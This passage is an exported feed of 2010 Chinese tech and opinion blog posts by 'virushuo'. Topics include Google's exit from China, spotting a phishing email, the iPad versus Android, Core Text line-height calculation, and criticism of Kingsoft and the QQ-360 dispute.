其他系统是否有移植机会</p>\n\n<p>从现在的情况看来，代码并不复杂。整个系统的难度其实在于对TCP协议的深入了解，对墙工作原理的深入了解。这些部分完成之后，原理并不复杂。</p>\n\n<p>可以把目前的alpha版本看作一份用代码写成的论文，其中是详细的论证过程。从代码的wiki看来，原作者据说不继续开发了，不过没关系，论文写完了，其实也就不需要他们那么nb的人来写产品了。您总不指望着科学家来做产品吧？</p>\n\n<p>至于最终的产品，就期待别人了。熟悉网络开发的人，估计很快就可以写出来各种版本了。期待。</p>\n\n<p>不知道我说的对不对，欢迎大家讨论。<br>\n</p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370766505",
    "timestampUsec" : "1313370766505126",
    "id" : "tag:google.com,2005:reader/item/0056afbdc8d26bff",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read" ],
    "title" : "五毛的末日",
    "published" : 1269362936,
    "updated" : 1269391584,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2010/03/24/post_72.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>Google走了，对于我来说，这是意料之中的事情。</p>\n\n<p>我在2个月前的一篇文章里面清楚的阐明了观点，说明了这个星球最大的信息传播者和最大的信息阻碍者之间的矛盾是如何的不可调和。所以Google走是必然的，也是好的。</p>\n\n<p>信息审查本来是一个藏着掖着的事，这次被直挺挺的扔到了公众面前。就算新华社的通稿也不得不说：Google不愿在中国运营\"受到审查的互联网搜索引擎\"。而，这篇官方通稿，只敢提要遵守法律，不敢提具体条款。他们当然不敢，因为根本没有条款。</p>\n\n<p>我相信，有条款，就算荒唐，也可以执行，没有条款就不可能执行。所以这篇官方通稿只不过是慌乱之中的掩耳盗铃。</p>\n\n<p>我们看到了四处一面倒的舆论，这没什么大不了的，宣传机器全开，加上大量的威胁和金钱利诱，确实能看上去一片欣欣向荣，好像那四万亿扔下去的公路。可惜过 一段时间之后，潮水退去，下面是金子还是沙子，有目共睹。</p>\n\n<p><a href=\"http://blog.donews.com/sunnyliang/archive/2010/03/16/1570418.aspx\">某党被亿万人念诵其名，是大神</a>，这没错。但Google被更多的人念诵其名，是超越大神的神。这故事，刚刚有了个开头。</p>\n\n<p>不客气的说，整个互联网行业最近几年，是被Google照亮着道路。没有Google的时代，很快会看出来败向。而墙外的野草会得到更多的养料。</p>\n\n<p>温室内的花朵会逐渐萎缩。那时候，就是五毛的末日，他们只剩下和自己玩了。</p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370766142",
    "timestampUsec" : "1313370766142429",
    "id" : "tag:google.com,2005:reader/item/8818f52c6f21d8ed",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "偶尔谈谈技术" ],
    "title" : "一次被钓鱼的实践和心得",
    "published" : 1270051596,
    "updated" : 1270051851,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2010/04/01/post_73.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>今天我在twitter上说我的QQ一年都用不了几次，不如卖掉。 <a href=\"http://www.twitter.com/cosbeta\">@cosbeta</a> 说他做生意比较需要短点的QQ号，因为在twitter上有了不少了解，我就干脆送给他了。晚上回来给了他相关信息。这时候发生了好玩的事情，竟然有人为了得到这个QQ号，想通过\"社会工程学\"的方法钓鱼。我虽然不会上当，但是觉得具有一定欺骗性，所以分享出来，提醒大家注意。</p>\n\n<p>邮件很短，截图在此</p>\n\n<p><img src=\"http://img.ly/system/uploads/000/182/181/original_Screen_shot_2010-03-31_at_8.39.27_PM.png\"></p>\n\n<p>1. 图中这个邮箱注册的不错。有一定欺骗性。在此也提醒大家，这不是 @cosbeta 的邮箱。要识别是不是常用邮箱，有一个快捷的方法，就是用google搜索一下，看看以前的活动记录。如果没有活动记录，一般是刚刚注册的。</p>\n\n<p>以往的活动记录，在互联网上相当于信用卡账单，这也是我一直劝大家不要太注意所谓隐私的原因之一。你需要给自己留下信用记录，以便别人查对。知道 @cosbeta 真正的邮箱的朋友也可以搜索一下，看看有多少结果。</p>\n\n<p>google一下看活动记录，这个办法甚至可以应对精心搭建的带有反向解析域名相似的邮件服务器（可称为官方钓鱼）。是简单而有效的办法。</p>\n\n<p>当然也有推友提到自己因为防止垃圾邮件，保护的很好，以致于没有任何搜索结果，这种情况是比较特殊的，可以通过其他方法验证，我下面也会提到。</p>\n\n<p>2 注意前面的cosbeta cosbeta，他确实设置了用户名，但正常人是不会这样写名字的。肯定是姓名的形式，就算用昵称，也很少有人重复两遍。碰上这种情况，至少应该注意提高警惕了。这不正常。</p>\n\n<p>3 注意判断对方书写习惯。这封邮件在这方面也略显粗糙。比如 @cosbeta 虽然在成都，但说话利索，很少在后面加\"咯\"这样的语气词。他的标点都是全角，一般不出现半角。这是由输入法的习惯和键盘布局决定的，也是类似指纹的标记，如果不换机器或输入法，通常不会有太大变化。</p>\n\n<p>4 还有一些其他细节线索可以判断一个邮件是否是钓鱼。这方面大家可慢慢思考，不多说。而我们需要做到的原则是，不要在不能确认身份的情况下说重要的东西。</p>\n\n<p>确认身份的方法包括但不限于：和对方谈一些细节问题，比如谈谈@cosbeta的具体业务，看看对方是否知道。我今天和@cosbeta第一次直接聊天的时候，也聊了不少话。这些对话都可以从细节中确认对方身份。</p>\n\n<p>当然，如果能打个电话问一下，可能会更容易点。对方的声音和说话习惯，是更难伪造的。在电话中多说几句，还可以注意到对方所处环境，是否局促，是否紧张，是否反应速度慢，这些迹象都代表了有异常发生，要特别注意。</p>\n\n<p>最好的方法还是双方都使用OTR签名，这是判断身份和保护信息安全的重要手段，虽然麻烦，但非常有效。当然送个QQ号这种小事就不用麻烦 @cosbeta 专门装个OTR了，我通过对话已经能确认他的身份了。具体做法很多，可以以此为基础，推导出来更多的办法。</p>\n\n<p>一个基本的原则是，要至少通过两个渠道来确认。比如 在twitter上dm一下，然后在gtalk上说一下，在网上说一下，电话说一下。让不同渠道说的内容相关，这样就可以确认出两边是否是一个人。这个思路可以举一反三。</p>\n\n<p><br>\n总结一下必须具备的意识： 1 理解重要信息可能被泄露，必须具有安全意识 2 保证安全是繁琐的，但很重要。所以请用多种渠道确认对方身份，这是最基本的一步。 这两点非常基本，但是如果可以深刻理解，确实可以解决很多问题。</p>\n\n<p><br>\n技巧说完了，我总结一下教训： twitter上坏人还是存在的，一个QQ号都值得这样做。其他的信息想必也有各种人，出于不同的目的而感兴趣。所以，用不明来源的第三方上推的推友，请记得改密码，没准你的密码早被存下了。我非常非常非常相信，有人曾经用某个第三方或是某个api收集了大量twitter帐号的密码和信息，在某些时候会使用的。</p>\n\n<p>安全意识必须常常记在心中，在关键问题上谨慎对待。注意，邮箱地址是可以伪造的，gmail难一些，但仍然有可能伪造。所以千万注意分寸，什么东西会让你丢钱，什么东西会让你送命。考虑好后果，做事就会谨慎。</p>\n\n<p><br>\n有一些不让人反感的确认信息小办法，可以分享。比如我要给别人汇款，对方短信过来一个帐号，怎么确认呢？礼貌起见，可以跟对方说：麻烦您能把具体金额再给我确认一下吗？对方如果能发出来细目，一般就差不多。第一次联系的人可以当作寒暄说一些往事，等等。</p>\n\n<p>一般来说，安全是非常难达到的目标，我们可以默认自己的行为是不安全的，然后通过一系列的手段来降低不安全的概率，最终达到一个比较好的平衡。本文列出的是一些简单，易于实施的办法。深刻理解这些原则，未必可以保证绝对安全，但至少可以应付大部分麻烦。</p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370765497",
    "timestampUsec" : "1313370765497652",
    "id" : "tag:google.com,2005:reader/item/fcf6323f88eed789",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "随便" ],
    "title" : "写在ipad即将到来的时候",
    "published" : 1270475352,
    "updated" : 1270658570,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2010/04/05/ipad_coming.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>我的朋友jack，这几天恰好在夏威夷，于是我就非常幸运的拜他所赐，买到了一个ipad。这可能是国内比较早的一批ipad吧。很多人难以理解Apple到底是什么东西，很多人嘲讽ipad是个无用的产品，很多人对苹果的印象是贵，样子好看等等，不幸的是，他们不了解这个公司，也不了解这个产品。似乎一个好的产品总是拥有完全相反的两方意见。</p>\n\n<p>2001年12月，苹果发布了ipod，那\"只不过\"是个音乐播放器，从此拉开了一个新时代的帷幕。这是一个把计算能力放在掌心和身上的时代。苹果曾经试图把计算能力放到每个桌面上，不过那一次失败了，开放的wintel联盟打败了封闭的苹果。最终我们看到，大部分桌面的计算设备是微软的操作系统和PC。</p>\n\n<p>在PC尚未普及到所有桌面的时候，移动计算的时代就开始了。这场战争从传统的手机制造商开始，Palm和Nokia曾经如日中天，曾经人们担心微软会重复在PC端的垄断，再次垄断移动设备。但是没多少人注意到苹果的行动，苹果从移动音乐设备进入，起初的对手看起来是SONY之类的消费电子制造商，现在回头看来，这是一个正确的选择。移动音乐设备的拥有量甚至不低于手机。</p>\n\n<p>等到苹果发布itouch的时候，局势就已经确定了。无论是SONY，微软，NOKIA...没有一个厂商可以做出来更好的产品。是的，苹果有很多缺点，但竞争对手的缺点更多。</p>\n\n<p>做为开发者，我尝试了一些设备，包括很多人认为有望和苹果抗衡的Android。结果非常令人失望。到目前为之，苹果的产品仍然是对于开发者最友好的产品。</p>\n\n<p>系统的封闭和开放，其实并不会改变产品的可用性，甚至产品是否开源，也并不改变产品的可用性。Android的开放性并没有带来太多好处，无论是对于最终用户还是开发者。而苹果，无论对于用户还是开发者，都是在目前条件下最好的选择。我用以下几点来论证我的观点：</p>\n\n<p><strong>1 </strong>对于用户来说，苹果用户的体验是平滑的，Android用户的体验有障碍（别的不说，就那一堆按键就足够烦人了）</p>\n\n<p><strong>2 </strong>对于用户来说，在appstore上获得的软件，无论免费还是收费，质量都高于android market</p>\n\n<p><strong>3 </strong>对于用户来说，主流Android手机和iphone的价格差距只有1/4</p>\n\n<p><strong>4 </strong>对于开发者来说，花费同样的精力可以在Cocoa平台上开发出更好的应用，因为其标准统一，不需要担心太多不必要的问题。</p>\n\n<p><strong>5 </strong>对于开发者来说，appstore完成了推广，收款代理，展示多个流程，只分30%的收益，实在超值，做共享软件的随便找个收款代理，分成比例都要至少20%这个，他们可只负责收款，你还要把更多的钱交给软件下载站，推广站...</p>\n\n<p><strong>6</strong> 对于开发者来说，Android的商用价值毫无意义，我不太可能跑去为一个汽车电子厂商工作，但我有可能业余时间写几个小程序放在appstore玩玩。</p>\n\n<p><strong>7</strong> 对于小型商业用户，平台是否封闭，许可证价格高低，对他们影响并不大，无论是WinCE还是iphone/ipad，有人能做出来好用的app才是关键(GPS导航基本都采用winCE，也卖的好好的，用户才不关心下面是CE还是Android，他们买的是导航仪)</p>\n\n<p><strong>8 </strong>对于大型商业用户，Android仍然不堪用，他们仍然要基于Linux自己开发。</p>\n\n<p><strong>9 </strong>对于所有人，Android未来并非毫无机会，但现在实在不值得投入。</p>\n\n<p>我拿到ipad，会在上面做一些东西。我坚信ipad在教育，多媒体等等方面都会有非常突出的表现。原本需要买6000块钱的计算机的场合，现在用3000块钱的ipad就可以代替了，从价格上看，对大部分用户也是值得的。</p>\n\n<p>Android尚且可以拿来和Cocoa平台比较，而悲剧的Symbian，甚至连被比较的价值都没有了。移动计算这个市场，距离nokia越来越远了。</p>\n\n<p><a href=\"http://en.virushuo.com/2010/04/why-i-think-that-iphoneipad-is-better.html\"> english version</a></p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370763719",
    "timestampUsec" : "1313370763719555",
    "id" : "tag:google.com,2005:reader/item/ad10f1c667a7cf2e",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "胡言乱语" ],
    "title" : "美国馆和他们的社会化媒体",
    "published" : 1274791691,
    "updated" : 1274791888,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2010/05/25/post_74.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>周日，应邀参观世博美国馆，并参加<a href=\"http://blog.usapavilion2010.com/2010/05/23/east-meets-west-geeks-meetup/\">东·西极客会</a>。</p>\n\n<p>活动本身并不出奇，我算不得反对世博人士，但对于一个虚拟生活的倡导者（用通俗的话来说就是足够宅）的人来说，去现实中参加一场展览型的活动是毫无意义的，这类\"信息\"在虚拟世界一览无遗，我并不需要去美国馆才能获知美国精神，也不需要去日本馆才知道日本人玩什么。估计主办方也明白这事，花钱再多也很难让观众新奇，所以，大家不约而同选择了放电影（或称短片）的方式。</p>\n\n<p>基于同样的原因，对于极客见面会也并无太多期望，当然能见到很多传说中的ID之后的人物也是非常有趣的。这次西方来的geek甚至有一个twitter id是两个字母的家伙。好玩之处是，西方的geek比东方健谈，他们似乎更愿意和人交流，而不象东方geek们随身带着各种数码装备，手机，笔记本，iPad一应俱全，随手拿出来就开始玩。不知道这种差别是什么造成的，但是想想\"宅\"这个词也是发源于东方，似乎也有点道理。</p>\n\n<p>真正让我感觉震惊的是美国馆的社会化媒体。这是一个慢热的过程，最开始，一个非常中国化的ID <a href=\"http://twitter.com/meiguoguan\">@meiguoguan</a> 出现在twitter上，那时候正逢\"历史老师真假\"事件时期，中文twitter圈子蔓延着怀疑一切的风气，对于这个ID，第一个问题就是真或假。当然，现在我们都知道这个ID是真的，而且是特意本土化的。</p>\n\n<p>等我们参观回来，这个ID终于爆发出了神奇的一面，他竟然针对每个来宾，在twitter上定制化的一一发送了问候语，给我的是\"<a href=\"http://twitter.com/MeiGuoGuan/status/14555836069\">感谢您的光临美国馆奇客日，期待你更多毛衣科技计划</a>\"，所谓毛衣科技计划，是我一直在跟他们讲最近的流行词\"毛衣\"所致。看到这条推，我确实笑出来了。这种应用社会化媒体的方式确实很别致，至少是我第一次体验。大部分所谓的官方帐号，都是发布官方新闻而已。那种玩法其实根本不需要人，只要把一个rss源同步到社会化媒体即可，意义并不大。最令人惊喜的社会化媒体，是让人感觉帐号后面确实是一个人而不是程序，是可以交互的，对方是知道你，并且理解你的，这会令人印象深刻。美国馆场馆本身，与观众并无太多交互（其实这大概也是所有场馆的问题），现实中的交互很难，网上的交互则容易的多，需要转换的往往只是观念。世博刚刚开始，还有几个月的时间，可以供他们发挥，希望能看到更多有意思的互动发生。</p>\n\n<p>回到开头，做为一个虚拟生活的倡导者，我认为在这种场合，虚拟化会高于现实也是同样原因，更多的交互和更方便的获取信息，终究会替换掉平淡，笨重又消耗资源的现实游览。<br>\n</p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370761953",
    "timestampUsec" : "1313370761953950",
    "id" : "tag:google.com,2005:reader/item/609ec4fa1144a152",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "偶尔谈谈技术" ],
    "title" : "如何使用Core Text计算一段文本绘制在屏幕上之后的高度",
    "published" : 1279308741,
    "updated" : 1279348363,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2010/07/17/cocoa-core-text-text-height.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p><a href=\"http://developer.apple.com/iphone/library/documentation/Carbon/Reference/CoreText_Framework_Ref/index.html\">Core Text</a>提供了一系列方便的函数，可以很容易的把文本绘制在屏幕上，对于一个Frame来说，一般并不需要担心文本的排列问题，这些Core Text的函数都可以直接搞定，只要给他一个大小合适的CGRect就可以。</p>\n\n<p>但，在某些情况下，我们还希望知道这段文本在绘制之后，对应绘制的字体字号设置，在屏幕上实际占用了多大面积。举例来说，有文本段落a，屏幕大小rect，通常做法是以rect创建path，然后创建CTFramesetter，再然后创建CTFrame，最后用CTFrameDraw画出来，这时候，往往文本段落占用的实际面积会小于rect，这时候就有必要获得这段文本所占用的真正面积。</p>\n\n<p>最理想的情况是使用</p>\n\n<p>double CTLineGetTypographicBounds( CTLineRef line, CGFloat* ascent, CGFloat* descent, CGFloat* leading );</p>\n\n<p>这是Core Text提供的函数，传入CTLine，就会得到这一行的ascent,descent和leading，在OSX上通常可以工作的很好，但是在iOS(iPhone/iPad)上这个函数的结果略有不同。</p>\n\n<p>正常情况下，计算行高只需要ascent+descent+leading即可。在这个略有不同的情况下，leading的值会出现偏差，导致算出来的结果是错误的。如果不管行距，ascent+descent计算出来的Glyph的高度还是正确的。</p>\n\n<p>这样就有了第一步</p>\n\n<p>在创建用于绘图的CFAttributedStringRef时，除了设置字体，多设置一个CTParagraphStyleRef，其中特别应该确定行距kCTParagraphStyleSpecifierLineSpacing。在计算这里时，先逐行计算ascent+descent，累加起来，再加上一个行数*之前设置好的行距，这样算出来的就是这些文本的实际高度，CTLineGetTypographicBounds返回的结果是宽度，这样就可得到文本实际填充面积的Rect了。</p>\n\n<p>但是这还是有问题，因为OSX上和iOS处理不同，所以事实上iOS的模拟器和真机的最终效果是不一样的，这样调试程序很麻烦。<br>\n于是还需要第二步</p>\n\n<p>在最终往页面上绘制的时候，不再用CTFrameDraw来一次绘制全部，而是使用CTLineDraw逐行画，在画之前，先用CGContextSetTextPosition来设置好每行文本的位置。这样就保证了在任何平台上绘制效果一致。</p>\n\n<p>问题就解决了。</p>\n\n<p>CoreText在OS X和iOS上实现有很多细节区别，比如说，对CTRun的划分方式也不一样，在iOS上划分出来的Run数量比OSX上少很多，是按照字体划分的Run，按照文档出来，这是正确的，但OSX上是一个字一个Run这样划分的，和文档不符。iOS上的处理显然效率更好。</p>\n\n<p>stackoverflow 上有一个<a href=\"http://stackoverflow.com/questions/2707710/core-texts-ctframesettersuggestframesizewithconstraints-returns-incorrect-size\">类似的讨论</a>，不过没考虑到iOS的区别 </p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370761541",
    "timestampUsec" : "1313370761541859",
    "id" : "tag:google.com,2005:reader/item/070a273d25f20232",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "随便" ],
    "title" : "金山的流氓事",
    "published" : 1289043672,
    "updated" : 1289047007,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2010/11/06/post_75.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>最近360 vs QQ这仗打的很厉害，这事暂且不说，我有另文详述。其中QQ方有一个义正言辞的成员，叫做金山。金山说360流氓，因为360帮用户卸了金山网盾。</p>\n\n<p>好吧，我就来列点东西，展示一下金山的干过什么。为什么要写这篇blog呢，是因为今天突然想起来了我是为什么彻底停止使用msn的，其实是被金山的msn防护盾骚扰的受不了了。金山耍流氓的行为堪称前无古人，其他公司最多还在PC上打仗，金山的流氓竟然连我这mac用户都骚扰到了。想起来这事就很生气，于是按照我一贯的习惯，决定在历史上留下这痕迹。</p>\n\n<p>一 \"立即安装最新版本 Messenger 保护盾，和好友加密聊天！ http://im.live.cn/safe/\"</p>\n\n<p>提起这句话，很多人都会有一段不舒服的回忆。使用msn的用户，从2010年2月左右，会时常收到好友发来的信息，信息内容就是这句话。这信息会反复发，甚至用户离线时候都在发。按我个人体验看来，就是早晨上班打开msn，立刻有n个，多的时候能有20多个好友跟我说话，内容都是这句话。</p>\n\n<p>这是史无前例的流氓行为。普通流氓软件，最多是不让卸载，强制劫持首页。msn保护盾是利用好友关系去欺骗你下载一个软件。所谓欺骗，是给你发消息的好友本人并不知道他的msn帐号向你发出了这条消息。而你一旦安装了这个软件，它就会再利用你的帐号向你的好友发送这样的消息。 <br>\n这样的行为已经不能简单用流氓来概括，因为它已经基本符合了病毒或是木马的定义，传播性又极强。我提醒好友删掉这东西，得到的回答基本都是不知道怎么删。后来我屏蔽了几十人，仍然会会有新人中招，实在没办法，最终我就此停用了msn。</p>\n\n<p>当时这个MSN保护盾软件是谁提供的呢？是金山。有新闻为证： 2010年01月27日新闻 \"金山软件MSN保护盾提升防毒能力\" <a href=\"http://www.enet.com.cn/article/2010/0127/A20100127604943.shtml\">http://www.enet.com.cn/article/2010/0127/A20100127604943.shtml</a></p>\n\n<p>另外，需要卸载则要<a href=\"http://www.dragongod.net/2010/02/msn-shell-make-msn-down/\">卸载\"金山基础服务\" </a></p>\n\n<p><a href=\"http://www.twitter.com/zhoushuqun\">@zhoushuqun</a> 当时<a href=\"http://zhoushuqun.wordpress.com/2010/03/28/windows-live-messenger-%E7%9A%84%E6%B5%81%E6%B0%93%E8%A1%8C%E4%B8%BA%EF%BC%9A%E5%86%92%E5%85%85%E7%94%A8%E6%88%B7%E5%8F%91%E9%80%81-messenger-%E4%BF%9D%E6%8A%A4%E7%9B%BE%E6%8E%A8%E5%B9%BF%E6%B6%88/\">写过blog详细记录了几天的情况 </a></p>\n\n<p>(要看到图片可能需要翻墙)</p>\n\n<p><br>\n二 其他流氓事</p>\n\n<p>\"谁知，下载下来一点击安装文件。机器一顿狂卡，然后就看着360安全卫士，安全卫士的arp防火墙一个接着一个消失。约莫几分钟之后，弹出一个对话框，\"已经清除了会影响软件安装的程序，请重启后安装\"......我靠。事先没有任何提示，这也他妈太彪悍了。\"</p>\n\n<p>来自 <a href=\"http://www.twitter.com/naodi\">@naodi</a>的blog <a href=\"http://www.naodi.net/blog/the-kingsoft-drug-overlords-tooa-rogue-acts/\">http://www.naodi.net/blog/the-kingsoft-drug-overlords-tooa-rogue-acts/</a></p>\n\n<p>\"很多网友在一路next的情况下被安装了金山网盾，要卸载的话就只能卸载傲游了，今天我发现，其实不用卸载傲游也能删除金山网盾，哈哈！<br>\n先上张图，傲游的卸载界面：（看图说话）\"</p>\n\n<p>来自 <a href=\"http://bbs.maxthon.cn/viewthread.php?tid=205122\">http://bbs.maxthon.cn/viewthread.php?tid=205122</a></p>\n\n<p>卸载金山网盾太欢乐了！<br>\n来自 <a href=\"http://www.douban.com/group/topic/15422173/\">http://www.douban.com/group/topic/15422173/</a> 这个看完能笑死。</p>\n\n<p>慢慢找还能找到好多。</p>\n\n<p>做为一个已经好多年不用windows的用户，其实他们打仗跟我一点关系都没有，二中列出的东西也都不是我亲身经历，我也不确保真实性。但是一中列出的事情完全亲身经历。我在推特上发出之后，n多人都表示当时非常痛苦。做为一个非windows用户，我被这些厂商骚扰的经历只此一次，就是金山干的。</p>\n\n<p>看完这些，金山的同学们能不能不要再那么冤枉的说：\"360强制卸载我们啊...\" </p>\n\n<p>现在金山趁火打劫，一年免费，我建议也不要相信他们。</p>\n\n<p>最后我还得多说一句，其实你完全没必要装这些东西，只要平时多注意就可以。这个我之前<a href=\"http://blog.devep.net/virushuo/2009/07/24/anonymous-security-guide-1.html\">也写到过</a>。</p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370757584",
    "timestampUsec" : "1313370757584042",
    "id" : "tag:google.com,2005:reader/item/17015163df13c9d7",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "随便" ],
    "title" : "流氓的背后是什么？",
    "published" : 1289105441,
    "updated" : 1289106733,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2010/11/07/why_china_internet_gangster.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>注：本文是因 <a href=\"http://www.twitter.com/guodaxia\">@guodaxia</a> 想知道这场乱仗的原因而起，2个问题也都是她所提，我起先写在我的buzz上，后来整理成此blog。</p>\n\n<p>最近QQ和360大战，战火颇有蔓延之势，IT/互联网行业口水战一直不少，很多网站也是靠着口水战产生的公关和市场费用生存的。但像这次，让行业之外的普通人也感觉到，并且因此利益受损的事件并不多，上次涉及如此之广的，大概还是魔兽世界争夺战吧。</p>\n\n<p>很多人奇怪，为什么几个软件会打的如此激烈，很多人分析，比如QQ侵占了360的地盘之类，不错，这确实是原因，但更深层的原因，流氓们的身后是什么，是否有人想过？</p>\n\n<h2>一 流氓的背后是垄断，垄断的背后是...</h2>\n\n<h3>1 法律无保障，程序无正义 </h3>\n\n<p>这是最主要的问题。 </p>\n\n<p>现在很多人认为是3721当年耍流氓，但事实上是cnnic以所谓的官方身份，通过试图颁发政府规范的方法争夺3721市场。对于被压制一方的创业者，唯一的办法就是通过技术上的手段先予以反抗，也就是后来大家都知道的流氓软件。当年这是一件大事，某种意义上，也是少见的民斗官并获得胜利案例。最近周鸿祎在公开信中说到\"被冤枉的愤怒让我几乎要冲过去决斗\"，大概就是如此。如果换一个角度看过来，就是说，我好好的创业，用户也喜欢（这并夸张，当年最早的一批用户是主动安装3721的，在没有搜索引擎的年代，去一个网站是有困难的，今天我们可以说\"搜索一下XXX，第一结果就是\"，当年只能靠一个字母一个字母的让对方抄下来，回家输入进去。在地址栏输入中文，确实方便了一些用户。如果没有后半段的流氓软件大战，这是创新），但突然冒出来一个政府的三产，要抢我的生意...</p>\n\n<p>没错，这是发生在用户计算机上的私斗，也确实置用户利益于不顾。很多人在呼喊：\"用户在哪里？\"，实际上，更应该呼喊的是\"法律在哪里\"？如果有法律保护，并通过正当程序解决这些纠纷，就会极大缓和这种私斗的行为。 </p>\n\n<h3>2 官方组织无权威 </h3>\n\n<p>正常行业都有行业工会来协调一些纠纷，做为法律之外的补充。互联网行业的互联网协会完全发挥不了这作用，他们没有能力协调纠纷。甚至会有倾向的支持某方，加入混战。而上级主管部门主要主管的是如何删除言论，引导舆论，在魔兽世界的争斗中甚至到了如何获取自己的利益。他们热衷于设置各种门槛，发各种许可证，他们还...</p>\n\n<p>至于怎么让行业健康发展，他们不关心。</p>\n\n<h3>3 垄断已经形成 </h3>\n\n<p>中国的互联网普及在非常短的时间内完成，在这个时间内一部分企业(或许是远见，或许是运气)正好站在了正确的地位，顺利获得了垄断地位。之后又缺乏足够的创新，只能复制，因此中国互联网同质化严重。这个问题并非存在在腾讯身上，一线互联网公司几乎都有这问题，当年博客兴起，所有互联网公司都做了一个，现在微博兴起，他们又都做了一个。</p>\n\n<p>垄断造成了各公司习惯利用自己的地位或话语权直接为自己谋取利益，这还是一个适合用丛林法则来解决问题的环境。</p>\n\n<p><br>\n<h3>4 互联网管制</h3></p>\n\n<p>互联网管制方更信任巨头，因为这些公司有良好的合作基础，所谓\"更知趣\"，也能给他们更大利益。管制者没有扶植小创业公司的兴趣和义务。这样的管制进一步压制创新，导致垄断更加严重。比如饭否本来可以撕开竞争的口子，但因为管制全军覆灭，同样的产品在巨头手里可以活下来并成为支柱产品，就是现在的新浪微博，以致于腾讯在这场战争中都需要到新浪开一个微博，并要求新浪给予实名认证。为什么新浪获胜？很简单，因为他们对内容审查最有心得，最有经验，做的最好。</p>\n\n<p><br>\n综上，整个市场在各方推动下，最终成为一个高垄断，缺乏法律制约，缺乏创新，资本非常集中的市场。在这样的市场中如果想获胜，只能采用非正常手段，而防守方为保护自己的垄断地位，也只能依靠流氓手段。这就是现状。 </p>\n\n<p>另外提醒一下，目前的战争和03年的3721 vs cnnic有几分相似。万网之类的当年还算巨人的公司，也发出过\"请不要忘记用户利益\"之类的呼声。历史总是重合的。</p>\n\n<p><br>\n<h2>二 他们做过的坏事</h2></p>\n\n<p>腾讯被骂做流氓，主要有两个问题，一为复制，二为协助跨省追捕</p>\n\n<h3>1 